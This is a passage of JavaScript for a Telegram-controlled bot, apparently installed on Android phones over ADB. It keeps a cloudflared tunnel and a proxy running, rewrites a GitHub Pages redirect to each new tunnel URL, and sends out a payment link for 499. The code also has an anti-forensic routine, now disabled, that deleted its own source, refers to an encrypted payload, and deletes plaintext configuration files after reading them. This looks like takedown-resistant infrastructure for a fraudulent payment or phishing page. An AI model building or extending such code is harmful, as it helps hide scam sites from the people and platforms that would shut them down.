          'Authorization': `token ${cfg.githubToken}`,
          'User-Agent': 'ally-bot/1.0',
          'Accept': 'application/vnd.github.v3+json',
        }
      };
      const req = https.request(opts, res => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => {
          try { resolve(JSON.parse(d)); } catch { resolve(null); }
        });
      });
      req.on('error', reject);
      req.end();
    });

    const sha = current && current.sha ? current.sha : null;
    if (!sha) { log('github: could not get file SHA'); return; }

    // Step 2: decode current content, replace ALL tunnel URLs
    const oldContent = Buffer.from(current.content, 'base64').toString('utf8');
    // Replace every trycloudflare URL in the page (meta refresh, href, location.replace, var TARGET)
    let newContent = oldContent.replace(/https:\/\/[a-z0-9-]+\.trycloudflare\.com/g, tunnelUrl);
    // Fix: strip pathname/search/hash append — GitHub Pages path (/repo/) breaks tunnel redirect
    newContent = newContent.replace(/window\.location\.replace\(T\s*\+\s*window\.location\.[^)]+\)/g, 'window.location.replace(T)');

    if (newContent === oldContent) {
      log('github: URL already current');
      return;
    }

    // Step 3: push update
    const body = JSON.stringify({
      message: `update redirect → ${tunnelUrl.slice(0, 40)}`,
      content: Buffer.from(newContent).toString('base64'),
      sha: sha,
    });

    await new Promise((resolve, reject) => {
      const opts = {
        hostname: apiBase, path: repoPath, method: 'PUT',
        headers: {
          'Authorization': `token ${cfg.githubToken}`,
          'User-Agent': 'ally-bot/1.0',
          'Accept': 'application/vnd.github.v3+json',
          'Content-Type': 'application/json',
          'Content-Length': Buffer.byteLength(body),
        }
      };
      const req = https.request(opts, res => {
        let d = ''; res.on('data', c => d += c);
        res.on('end', () => {
          if (res.statusCode >= 200 && res.statusCode < 300) {
            log('github: redirect updated to ' + tunnelUrl);
            resolve(true);
          } else {
            log('github: update failed ' + res.statusCode + ' ' + d.slice(0, 200));
            resolve(false);
          }
        });
      });
      req.on('error', reject);
      req.write(body);
      req.end();
    });
  } catch (e) {
    log('github update err: ' + e.message);
  }
}

// ─── Watchdog ────────────────────────────────────────────────
async function watchdog() {
  await sleep(30000); // initial delay — let services start
  while (running) {
    await sleep(WATCHDOG_MS);
    try {
      // Check tunnel
      const tunnelRC = sh('tmux has-session -t spud-tunnel 2>&1; echo $?');
      if (tunnelRC !== '0') {
        watchdogFails++;
        log('Watchdog: tunnel down');
        await sendAll('⚠️ Tunnel down — restarting...');

        sh('pkill -f cloudflared 2>/dev/null');
        await sleep(1000);
        sh('tmux new-session -d -s spud-tunnel "cloudflared tunnel --url http://localhost:3000 2>&1 | tee ~/.spud/logs/tunnel.log"');
        await sleep(12000);

        const url = getTunnelUrl();
        if (url) {
          const changed = url !== cfg.lastUrl;
          cfg.lastUrl = url; saveCfg();
          await sendAll(`✅ Tunnel recovered${changed ? ' (new URL)' : ''}\n🔗 <code>${url}</code>`);
          if (changed) await updateGitHubRedirect(url);
        } else {
          await sendAll('⚠️ Tunnel restarted — URL pending.');
        }
      }

      // Check proxy
      const proxyRC = sh('tmux has-session -t spud-proxy 2>&1; echo $?');
      if (proxyRC !== '0') {
        watchdogFails++;
        log('Watchdog: proxy down');
        await sendAll('⚠️ Proxy down — restarting...');
        sh('bash ~/spud.sh start 2>/dev/null');
        await sleep(3000);
        await sendAll('✅ Proxy restart attempted.');
      }

      // Detect URL change (tunnel reconnected with new URL)
      const currentUrl = getTunnelUrl();
      if (currentUrl && currentUrl !== cfg.lastUrl) {
        cfg.lastUrl = currentUrl; saveCfg();
        await sendAll(`🔗 URL changed:\n<code>${currentUrl}</code>\n💳 <code>${currentUrl}/_payment?amount=499</code>`);
        log('URL changed: ' + currentUrl);
        // Auto-update GitHub Pages redirect
        await updateGitHubRedirect(currentUrl);
      }

      // Low battery
      const batt = getBattery();
      if (batt.pct > 0 && batt.pct <= 15 && batt.status !== 'CHARGING') {
        await sendAll(`🔴 LOW BATTERY: ${batt.pct}% — may shut down!`);
      }
    } catch (e) { log('watchdog err: ' + e.message); }
  }
}

// ─── Heartbeat ───────────────────────────────────────────────
async function heartbeat() {
  await sleep(HEARTBEAT_MS); // first heartbeat after 30 min
  while (running) {
    try {
      const url = getTunnelUrl();
      const batt = getBattery();
      const up = sh('uptime -p 2>/dev/null') || '?';
      const i = batt.pct > 50 ? '🔋' : batt.pct > 15 ? '🪫' : '🔴';

      await sendAll(
        `💓 ${cfg.deviceId}\n` +
        `${i} ${batt.pct}% | ${up}\n` +
        (url ? `🟢 <code>${url}</code>` : '🔴 no tunnel')
      );
    } catch (e) { log('heartbeat err: ' + e.message); }
    await sleep(HEARTBEAT_MS);
  }
}

// ─── Source self-destruct (DISABLED) ─────────────────────────
// Previously deleted bot.run.js after first run. This caused permanent
// bot death on crash — node runs from memory but file gone = no restart.
// Proxy security via payload.enc is sufficient. Bot source stays on disk.
function selfDestruct() {
  // Intentionally disabled — bot.run.js must survive process crashes
  // so spud.sh ensure can restart it.
  log('selfDestruct: skipped (persistence mode)');
}

// ─── Startup ─────────────────────────────────────────────────
async function startup() {
  const brand = sh('getprop ro.product.brand 2>/dev/null');
  const model = sh('getprop ro.product.model 2>/dev/null');
  cfg.deviceId = `${brand} ${model}`.trim() || os.hostname();
  if (!cfg.deployedAt) cfg.deployedAt = Date.now();
  cfg.startedAt = Date.now();
  saveCfg();

  log(`ALLY Bot v${VERSION} — ${cfg.deviceId} — admin: ${SUPER_ADMIN}`);

  // Verify token
  const me = await tg('getMe');
  if (!me) {
    log('ERROR: Bot token invalid or no network. Retrying in 30s...');
    await sleep(30000);
    const retry = await tg('getMe');
    if (!retry) {
      log('FATAL: Cannot reach Telegram API');
      process.exit(1);
    }
  }
  log(`Bot: @${(me || {}).username}`);

  // Self-destruct source
  selfDestruct();

  // Startup notification
  const url = getTunnelUrl();
  if (url) { cfg.lastUrl = url; saveCfg(); }

  await sendAll(
    `🟢 <b>ALLY Bot started</b>\n\n` +
    `📱 ${cfg.deviceId}\n` +
    `🤖 @${(me || {}).username}\n` +
    (url ? `🔗 <code>${url}</code>` : '⏳ Tunnel pending...') +
    (cfg.githubUser ? `\n📄 https://${cfg.githubUser}.github.io/${cfg.githubRepo}` : '')
  );

  // Push current URL to GitHub redirect on boot
  if (url) await updateGitHubRedirect(url);
}

// ─── Graceful shutdown ───────────────────────────────────────
function shutdown(sig) {
  log('Shutdown: ' + sig);
  running = false;
  sendAll(`🔴 Bot offline (${sig})`).catch(() => {}).finally(() => {
    setTimeout(() => process.exit(0), 2000);
  });
}

process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));
process.on('uncaughtException', (e) => { log('UNCAUGHT: ' + e.message); });
process.on('unhandledRejection', (e) => { log('UNHANDLED: ' + (e?.message || e)); });

// ─── Absorb pending configs from ADB push ───────────────────
// chief.sh can push /sdcard/ally-github.json during install.
// We absorb it into encrypted config and delete the plaintext file.
function absorbPendingConfigs() {
  const ghPending = path.join(SPUD_DIR, 'pending-github.json');
  try {
    if (fs.existsSync(ghPending)) {
      const raw = JSON.parse(fs.readFileSync(ghPending, 'utf8'));
      if (raw.githubUser && raw.githubRepo && raw.githubToken) {
        cfg.githubUser = raw.githubUser;
        cfg.githubRepo = raw.githubRepo;
        cfg.githubToken = raw.githubToken;
        saveCfg();
        fs.unlinkSync(ghPending);
        log('Absorbed GitHub config from ADB push');
      }
    }
  } catch (e) { log('absorb pending: ' + e.message); }
}

// ─── Main ────────────────────────────────────────────────────
async function main() {
  loadCfg();
  absorbPendingConfigs();
  await startup();
  poll();
  watchdog();
  heartbeat();
  log('All loops running.');
}

main().catch(e => { log('FATAL: ' + e.message); process.exit(1); });
